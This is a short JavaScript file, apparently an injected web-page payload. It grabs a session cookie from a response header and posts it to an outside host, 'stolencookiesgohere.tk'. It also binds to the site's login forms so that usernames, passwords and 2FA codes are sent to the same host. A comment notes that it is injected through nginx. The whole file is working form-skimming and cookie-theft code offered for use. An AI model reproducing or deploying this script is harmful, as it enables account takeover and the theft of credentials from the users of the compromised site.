// Posts the session cookie to our malicious domain. Fairly standard procedure
// for any sort of javascript attack.
var req = new XMLHttpRequest();
req.open('GET', document.location, false);
req.send(null);
var cookie = req.getResponseHeader('X-Stolen-Cookie').toLowerCase();
xhttp = new XMLHttpRequest();
xhttp.open("POST", "http://stolencookiesgohere.tk", true);
xhttp.send(cookie);
//alert(cookie);

// Posts the username, password, and 2FA code when the user logs in via the sidebar login form.
var postPassword = function(){
    var postme = document.getElementById('login-form');
    var datastring = postme.elements[0].value + ":" + postme.elements[1].value + ":" + postme.elements[2].value;
    xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://stolencookiesgohere.tk/passwords", true);
    xhttp.send(datastring);
}

// Posts the username, password, and 2FA code when the user logs in via the login page.
var postPassword2 = function(){
    var username = document.getElementById('username');
    var password=  document.getElementById('password');
    var datastring = username.value + ":" + password.value;
    xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://stolencookiesgohere.tk/passwords", true);
    xhttp.send(datastring);
}

// Binds the submission functions to the forms
var form = document.getElementById('login-form');
form.onsubmit = function(){ return postPassword() };
var ufield = document.getElementById('username');
if(ufield !== null){
var form2 = ufield.parentElement.parentElement.parentElement.parentElement;
form2.onsubmit = function(){ return postPassword2() };
}

// NOTE: nginx doesn't like inserting more than a few bytes of html at the end of a document,
// which is why this is broken out into a separate file. 
